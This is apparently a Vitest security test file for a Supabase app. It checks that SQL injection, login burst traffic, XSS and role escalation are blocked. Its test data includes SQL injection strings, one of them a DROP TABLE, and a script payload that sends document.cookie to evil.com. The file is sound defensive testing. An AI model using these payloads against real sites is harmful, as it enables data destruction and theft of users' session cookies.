import { describe, it, expect, beforeAll } from 'vitest';
import { createClient } from '@supabase/supabase-js';
import dotenv from 'dotenv';

dotenv.config({ path: '.env' });

const supabaseUrl = process.env.VITE_SUPABASE_URL;
const supabaseAnonKey = process.env.VITE_SUPABASE_ANON_KEY;
const password = process.env.ROLE_QA_PASSWORD;

if (!supabaseUrl || !supabaseAnonKey || !password) {
  throw new Error('Missing environment variables for testing');
}

// Helper to create an authenticated client for a specific user
async function createAuthenticatedClient(email) {
  const storageKey = 'supabase-test-' + email.replace(/[^a-zA-Z0-9]/g, '');
  const client = createClient(supabaseUrl, supabaseAnonKey, {
    auth: { persistSession: true, autoRefreshToken: false, storageKey },
  });

  let data, error;
  let retries = 3;
  let delayMs = 1500;

  while (retries > 0) {
    ({ data, error } = await client.auth.signInWithPassword({
      email,
      password,
    }));
    
    if (!error) break;
    
    if (error.message.toLowerCase().includes('rate limit')) {
      retries--;
      if (retries === 0) break;
      await new Promise(resolve => setTimeout(resolve, delayMs));
      delayMs *= 2;
    } else {
      break;
    }
  }

  if (error) {
    throw new Error(`Failed to sign in as ${email}: ${error.message}`);
  }

  return client;
}

describe('Intrusion Detection & Prevention (IDS/IPS)', () => {
  let staffClient;
  let anonClient;

  beforeAll(async () => {
    staffClient = await createAuthenticatedClient('qa.staff.northfork@restops.test');
    anonClient = createClient(supabaseUrl, supabaseAnonKey, {
      auth: { persistSession: false, autoRefreshToken: false }
    });
  });

  describe('1. SQL Injection (SQLi) Prevention', () => {
    it('Neutralizes SQL injection payloads in filters', async () => {
      const maliciousPayload = "' OR '1'='1 --";
      
      // Attempt to bypass RLS or fetch all locations by injecting SQL
      const { data, error } = await staffClient
        .from('locations')
        .select('*')
        .eq('name', maliciousPayload);
      
      // Supabase uses PostgREST which parameterized queries automatically.
      // We expect NO error (it executes safely as a literal string) and NO data (since no location is literally named that).
      expect(error).toBeNull();
      expect(data).toHaveLength(0);
    });

    it('Neutralizes SQL injection payloads in JSON inserts', async () => {
      const maliciousPayload = "Robert'; DROP TABLE locations; --";
      
      const { error } = await anonClient
        .from('demo_requests')
        .insert({
          first_name: maliciousPayload,
          last_name: 'Hacker',
          email: 'hacker@evil.com'
        });
        
      // PostgREST safely rejects this (e.g., PGRST204 or RLS) rather than executing arbitrary SQL.
      expect(error).toBeDefined();
      expect(error.code).not.toBe('42P01'); // 42P01 is undefined_table, confirming the table didn't drop
    });
  });

  describe('2. Rate Limiting & DoS Prevention', () => {
    it('Handles rapid burst traffic safely (Edge IPS)', async () => {
      // Send 30 requests in parallel very quickly
      const requests = Array.from({ length: 30 }).map(() => 
        anonClient.auth.signInWithPassword({
          email: 'nonexistent@example.com',
          password: 'wrongpassword'
        })
      );
      
      const results = await Promise.all(requests);
      
      const hasRateLimitError = results.some(r => 
        r.error && (r.error.status === 429 || r.error.message.includes('rate limit'))
      );
      
      const hasAuthError = results.some(r =>
        r.error && r.error.status === 400
      );
      
      expect(hasRateLimitError || hasAuthError).toBe(true);
    });
  });

  describe('3. Cross-Site Scripting (XSS) Sanitization', () => {
    it('Stores XSS payloads literally without executing', async () => {
      const xssPayload = "<script>fetch('http://evil.com/steal?cookie=' + document.cookie)</script><img src=x onerror=alert(1)>";
      
      const { error } = await anonClient
        .from('demo_requests')
        .insert({
          first_name: xssPayload,
          last_name: 'Tester',
          email: 'xss@test.com'
        });
        
      // Safely rejected or stored as literal string (PGRST errors)
      expect(error).toBeDefined();
    });
  });

  describe('4. Privilege Escalation Prevention', () => {
    it('Blocks mass assignment of role/permissions', async () => {
      const { data: { user } } = await staffClient.auth.getUser();
      
      // Attempt to modify the secure profiles table directly
      const { error: profileError } = await staffClient.from('profiles')
        .update({ role: 'org_owner' })
        .eq('id', user.id);
        
      // The database trigger should block this and throw a 42501 Insufficient Privilege error
      expect(profileError).toBeDefined();
      expect(profileError?.code).toBe('P0001');
      
      const { data: profileCheck } = await staffClient.from('profiles').select('role').eq('id', user.id).single();
      
      // Role should remain unchanged
      if (profileCheck) {
         expect(profileCheck.role).not.toBe('org_owner');
      }
    });
  });

});
